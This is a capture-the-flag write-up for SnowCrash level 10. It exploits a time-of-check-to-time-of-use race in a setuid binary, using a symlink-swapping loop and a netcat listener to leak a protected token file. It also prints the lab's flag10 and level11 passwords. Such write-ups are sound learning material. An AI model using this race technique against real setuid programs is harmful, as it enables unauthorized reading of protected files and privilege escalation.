# Level 10 - You TOCTOU Me?

## Home Content

- The folder contains a binary named `level10` owned by `flag10`.
- The SETUID and SETGID bits are set.
- There is also a file named `token` owned by `flag10`.
- Groups and others have no rights on `token`.

```sh
level10@SnowCrash:~$ ls -al
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

## `level10` Program

### Arguments

- `level10` takes two arguments, a filename and an host address.
- The idee seems to be to let `level10` open for us the `token` file and display its content at the host address.
- But `level10` program claims that we don't have access to `token` :(

```sh
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
level10@SnowCrash:~$ ./level10 token
./level10 file host
	sends file to host if you have access to it
level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
level10@SnowCrash:~$
```

### Decompile the code

- ... with [dogbolt.org](https://dogbolt.org)

```c
v1 = v0[1];
v2 = v0[2];
if (access(v0[1], 4))
{
    v14 = printf("You don't have access to %s\n");
}
```

...

```c
v4 = open(v1, 0, 8);
```

- The program checks the rights on the file given as argument using the `acces` function.
- `access` checks wether the real user id (here `level10` ; the effective user id being `flag10`) have read rights on a file.

## `access`

- `access` have a well known weakness as described in the `man` `access(2)`:

```
 Warning: Using these calls to check if a user is authorized to,
       for example, open a file before actually doing so using open(2)
       creates a security hole, because the user might exploit the short
       time interval between checking and opening the file to manipulate
       it.  For this reason, the use of this system call should be
       avoided.
```

## Time-of-check To Time-of-use (TOCTOU)

- To exploit the race condition we provide as argument a random file on which `level10` has the appropriate rights.
- Then we swap it with `token` after the check with `access` but prior to the opening.
- For this, we run a loop in which a symbolic link switches between a genuine file our own and `token`.
- In parallel we run a loop who executes `level10` with the symbolic link as argument.

## You TOCTOU Me?

- We listen on a terminal:

```sh
$ while true ; do netcat -l 127.0.0.1 6969; done
```

- and run the loops on another one.

```sh
level10@SnowCrash:~$ touch /tmp/mykey
level10@SnowCrash:~$ while true; do ln -sf /home/user/level10/token /tmp/mykey; ln -sf /tmp/test /tmp/mykey; done &
level10@SnowCrash:~$ for i in {1..1000}; do /home/user/level10/level10 /tmp/mykey 127.0.0.1; done
level10@SnowCrash:~$ killall bash
```

# Flag

- `flag10` password: `woupa2yuojeeaaed06riuj63c`
- `level11` password (flag): `feulo4b72j7edeahuete3no7c`
